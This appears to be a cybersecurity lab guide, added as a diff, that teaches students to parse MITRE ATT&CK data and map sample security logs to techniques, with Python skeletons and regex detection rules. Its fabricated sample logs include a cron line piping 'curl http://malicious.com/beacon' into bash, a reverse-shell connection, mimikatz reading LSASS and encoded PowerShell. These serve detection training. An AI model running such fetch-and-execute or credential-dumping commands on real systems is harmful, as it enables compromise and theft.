@@ -1,0 +1,379 @@
+MITRE ATT&CK Mapping for Incident Detection
+Objectives
+By the end of this lab, students will be able to:
+
+Understand the MITRE ATT&CK framework structure and its application in cybersecurity
+Map detected security incidents to specific MITRE ATT&CK techniques and tactics
+Analyze system logs to identify attack patterns using the framework
+Create automated detection rules based on MITRE ATT&CK techniques
+Generate incident reports with proper MITRE ATT&CK classifications
+Prerequisites
+Basic understanding of cybersecurity concepts and common attack methods
+Familiarity with Linux command line operations
+Basic Python programming knowledge
+Understanding of log file formats (Windows Event Logs, Linux auth logs)
+Lab Environment
+Al Nafi provides ready-to-use Linux-based cloud machines for this lab. Click Start Lab to access your pre-configured environment with:
+
+Ubuntu Linux with Python 3.x
+Sample security log files
+MITRE ATT&CK framework data
+Required Python libraries (requests, pandas, stix2)
+Task 1: Setting Up the MITRE ATT&CK Environment
+Step 1: Create Lab Directory Structure
+mkdir -p ~/mitre-lab/{data,scripts,logs,reports}
+cd ~/mitre-lab
+
+# Download MITRE ATT&CK data
+wget https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json -O data/enterprise-attack.json
+Step 2: Install Required Libraries
+pip3 install requests pandas stix2 pyyaml
+Step 3: Create Sample Log Files
+# Windows security log sample
+cat > logs/windows_security.log << 'EOF'
+2024-01-15 10:30:15 EventID:4688 Process:powershell.exe CommandLine:"powershell -enc SQBuAHYAbwBrAGUA"
+2024-01-15 10:31:22 EventID:4697 Service:malicious_svc Path:C:\temp\backdoor.exe
+2024-01-15 10:32:10 EventID:4663 Object:C:\Windows\System32\lsass.exe Access:Read Process:mimikatz.exe
+2024-01-15 10:33:45 EventID:4648 Account:admin Target:DC01 Process:net.exe
+2024-01-15 10:34:12 EventID:5156 Protocol:TCP Source:192.168.1.100 Dest:10.0.0.5 Port:445
+EOF
+
+# Linux auth log sample
+cat > logs/linux_auth.log << 'EOF'
+Jan 15 10:30:15 server sshd[1234]: Accepted password for root from 192.168.1.100
+Jan 15 10:31:22 server sudo: admin : USER=root ; COMMAND=/bin/bash
+Jan 15 10:32:10 server cron[9876]: (root) CMD (curl http://malicious.com/beacon | bash)
+Jan 15 10:33:45 server systemd[1]: Started suspicious-service.service
+EOF
+
+# Network log sample
+cat > logs/network.log << 'EOF'
+2024-01-15 10:30:15 TCP 192.168.1.100:1234 -> 10.0.0.5:445 SMB connection
+2024-01-15 10:31:22 DNS Query: malicious-domain.com
+2024-01-15 10:32:10 HTTP GET /payload.exe User-Agent: PowerShell
+2024-01-15 10:33:45 TCP 192.168.1.100:4444 -> 203.0.113.1:443 Reverse shell
+EOF
+Task 2: Building the MITRE ATT&CK Parser
+Step 1: Create MITRE Parser Module
+Create scripts/mitre_parser.py:
+
+#!/usr/bin/env python3
+"""
+MITRE ATT&CK Framework Parser
+Students: Complete the methods to parse and query MITRE ATT&CK data
+"""
+
+import json
+
+class MitreAttackParser:
+    def __init__(self, json_file_path):
+        """Initialize parser with MITRE ATT&CK JSON data"""
+        self.json_file_path = json_file_path
+        self.techniques = {}
+        self.tactics = {}
+        self.load_data()
+    
+    def load_data(self):
+        """
+        Load MITRE ATT&CK data from JSON file
+        TODO: Implement JSON file loading
+        TODO: Call parse_techniques() and parse_tactics()
+        """
+        pass
+    
+    def parse_techniques(self):
+        """
+        Parse techniques from MITRE ATT&CK data
+        TODO: Iterate through objects with type 'attack-pattern'
+        TODO: Extract technique ID from external_references
+        TODO: Store technique name, description, tactics, and platforms
+        Hint: Look for 'mitre-attack' in source_name
+        """
+        pass
+    
+    def parse_tactics(self):
+        """
+        Parse tactics from MITRE ATT&CK data
+        TODO: Iterate through objects with type 'x-mitre-tactic'
+        TODO: Extract tactic information
+        TODO: Store in self.tactics dictionary
+        """
+        pass
+    
+    def get_technique_by_id(self, technique_id):
+        """
+        Retrieve technique details by ID
+        TODO: Return technique from self.techniques dictionary
+        """
+        pass
+    
+    def search_techniques_by_keyword(self, keyword):
+        """
+        Search techniques by keyword in name or description
+        TODO: Implement case-insensitive search
+        TODO: Return list of matching techniques with id, name, description
+        """
+        pass
+Step 2: Test the Parser
+cd ~/mitre-lab/scripts
+python3 mitre_parser.py
+Expected output: Number of loaded techniques and tactics
+
+Task 3: Creating the Log Analyzer
+Step 1: Build Detection Rules
+Create scripts/log_analyzer.py:
+
+#!/usr/bin/env python3
+"""
+Log Analyzer with MITRE ATT&CK Mapping
+Students: Complete the detection and analysis methods
+"""
+
+import re
+import json
+from datetime import datetime
+from mitre_parser import MitreAttackParser
+
+class LogAnalyzer:
+    def __init__(self, mitre_parser):
+        self.mitre_parser = mitre_parser
+        self.detection_rules = self.load_detection_rules()
+        self.findings = []
+    
+    def load_detection_rules(self):
+        """
+        Define detection rules mapping patterns to MITRE ATT&CK techniques
+        TODO: Add more detection rules for different techniques
+        """
+        return {
+            'T1059.001': {  # PowerShell
+                'name': 'PowerShell Execution',
+                'patterns': [
+                    r'powershell\.exe.*-enc',
+                    r'powershell.*-EncodedCommand'
+                ],
+                'log_types': ['windows_security']
+            },
+            'T1003.001': {  # LSASS Memory
+                'name': 'Credential Dumping',
+                'patterns': [
+                    r'mimikatz\.exe',
+                    r'lsass\.exe.*Access:Read'
+                ],
+                'log_types': ['windows_security']
+            },
+            # TODO: Add rules for T1543.003 (Service Installation)
+            # TODO: Add rules for T1071.001 (Web Protocols C2)
+            # TODO: Add rules for T1046 (Network Service Scanning)
+        }
+    
+    def analyze_log_file(self, log_file_path, log_type):
+        """
+        Analyze a single log file for MITRE ATT&CK techniques
+        TODO: Read log file content
+        TODO: Check each detection rule against log content
+        TODO: Call check_patterns for matching rules
+        """
+        pass
+    
+    def check_patterns(self, log_content, technique_id, rule, log_file):
+        """
+        Check if patterns match in log content
+        TODO: Use regex to find pattern matches
+        TODO: Extract matched log lines
+        TODO: Create finding dictionary with technique details
+        TODO: Append to self.findings
+        """
+        pass
+    
+    def calculate_severity(self, technique_id):
+        """
+        Calculate severity based on technique type
+        TODO: Implement severity logic
+        High: Credential access, persistence, privilege escalation
+        Medium: Execution, command and control
+        Low: Discovery, collection
+        """
+        pass
+    
+    def generate_report(self, output_file):
+        """
+        Generate JSON report of findings
+        TODO: Create report structure with findings summary
+        TODO: Include severity breakdown
+        TODO: Write to JSON file
+        """
+        pass
+Step 2: Run Log Analysis
+python3 log_analyzer.py
+Step 3: View Results
+Create scripts/view_results.py:
+
+#!/usr/bin/env python3
+"""
+Display analysis results in readable format
+TODO: Load JSON report
+TODO: Display summary statistics
+TODO: Show detailed findings with technique information
+"""
+
+import json
+
+def display_results(report_file):
+    """
+    Display formatted analysis results
+    TODO: Implement result display logic
+    """
+    pass
+
+if __name__ == "__main__":
+    display_results('../reports/analysis_report.json')
+Task 4: Automated Incident Mapping
+Step 1: Create Auto-Mapper
+Create scripts/auto_mapper.py:
+
+#!/usr/bin/env python3
+"""
+Automated MITRE ATT&CK Mapping Tool
+Students: Complete the indicator mapping logic
+"""
+
+import json
+from mitre_parser import MitreAttackParser
+
+class AutoMapper:
+    def __init__(self, mitre_parser):
+        self.mitre_parser = mitre_parser
+        self.indicator_mappings = self.load_indicator_mappings()
+    
+    def load_indicator_mappings(self):
+        """
+        Define mappings between indicators and techniques
+        TODO: Add more indicator categories and mappings
+        """
+        return {
+            'file_indicators': {
+                'powershell.exe': ['T1059.001'],
+                'cmd.exe': ['T1059.003'],
+                'mimikatz.exe': ['T1003.001'],
+                # TODO: Add more file indicators
+            },
+            'network_indicators': {
+                'port_445': ['T1021.002'],
+                'port_3389': ['T1021.001'],
+                # TODO: Add more network indicators
+            },
+            'behavior_indicators': {
+                'encoded_powershell': ['T1059.001', 'T1027'],
+                'service_creation': ['T1543.003'],
+                # TODO: Add more behavior indicators
+            }
+        }
+    
+    def map_indicators(self, indicators):
+        """
+        Map indicators to MITRE ATT&CK techniques
+        TODO: Check each indicator against all mapping categories
+        TODO: Return set of mapped techniques and details
+        """
+        pass
+    
+    def generate_technique_details(self, technique_ids):
+        """
+        Get detailed information for techniques
+        TODO: Query MITRE parser for each technique
+        TODO: Return list of technique details
+        """
+        pass
+    
+    def create_incident_report(self, incident_name, indicators, output_file):
+        """
+        Create comprehensive incident report
+        TODO: Map indicators to techniques
+        TODO: Generate technique details
+        TODO: Group by tactics
+        TODO: Add recommendations
+        TODO: Write JSON report
+        """
+        pass
+    
+    def generate_recommendations(self, technique_details):
+        """
+        Generate security recommendations
+        TODO: Based on identified techniques, suggest mitigations
+        Example: If T1059.001 detected, recommend PowerShell logging
+        """
+        pass
+Step 2: Test Auto-Mapper
+python3 auto_mapper.py
+Step 3: Create Custom Detection Rules
+Create scripts/custom_rules.yaml:
+
+# Custom Detection Rules
+# Students: Add your own detection rules here
+
+rules:
+  - id: "CUSTOM_001"
+    technique_id: "T1059.001"
+    name: "Suspicious PowerShell Execution"
+    description: "Detects obfuscated PowerShell commands"
+    patterns:
+      - "powershell.*-windowstyle hidden"
+      - "powershell.*-noprofile"
+    severity: "HIGH"
+    log_types: ["windows_security"]
+    
+  # TODO: Add rule for file deletion (T1070.004)
+  # TODO: Add rule for process injection (T1055)
+  # TODO: Add rule for scheduled tasks (T1053.005)
+Expected Outcomes
+After completing this lab, you should have:
+
+Functional MITRE ATT&CK parser that loads and queries framework data
+Log analyzer that detects techniques in security logs
+Automated mapper that suggests techniques based on indicators
+JSON reports showing detected techniques with severity ratings
+Custom detection rules for specific attack patterns
+Example output structure:
+
+{
+  "total_findings": 8,
+  "findings_by_severity": {
+    "HIGH": 3,
+    "MEDIUM": 4,
+    "LOW": 1
+  },
+  "techniques_detected": ["T1059.001", "T1003.001", "T1543.003"],
+  "tactics_coverage": ["execution", "credential-access", "persistence"]
+}
+Troubleshooting Tips
+Issue: JSON parsing errors
+
+Verify the MITRE ATT&CK JSON file downloaded correctly
+Check file encoding (should be UTF-8)
+Validate JSON structure using python3 -m json.tool data/enterprise-attack.json
+Issue: No patterns detected
+
+Ensure regex patterns are properly escaped
+Test patterns individually using Python's re module
+Verify log file format matches expected structure
+Issue: Missing technique details
+
+Confirm technique IDs are correct (format: T####.###)
+Check that parse_techniques() successfully populated the dictionary
+Verify external_references contain 'mitre-attack' source
+Conclusion
+This lab introduced the MITRE ATT&CK framework for mapping security incidents to standardized techniques and tactics. You learned to:
+
+Parse and query MITRE ATT&CK framework data programmatically
+Analyze security logs for attack technique indicators
+Automate the mapping of security events to ATT&CK techniques
+Generate structured incident reports with proper classifications
+The MITRE ATT&CK framework is essential for threat intelligence, detection engineering, and incident response. These skills enable you to communicate security findings using industry-standard terminology and improve detection capabilities by understanding adversary behaviors.
+
+Next Steps:
+
+Explore the full MITRE ATT&CK matrix at attack.mitre.org
+Practice mapping real-world incidents to techniques
+Develop detection rules for additional techniques
+Integrate ATT&CK mappings into your security monitoring tools
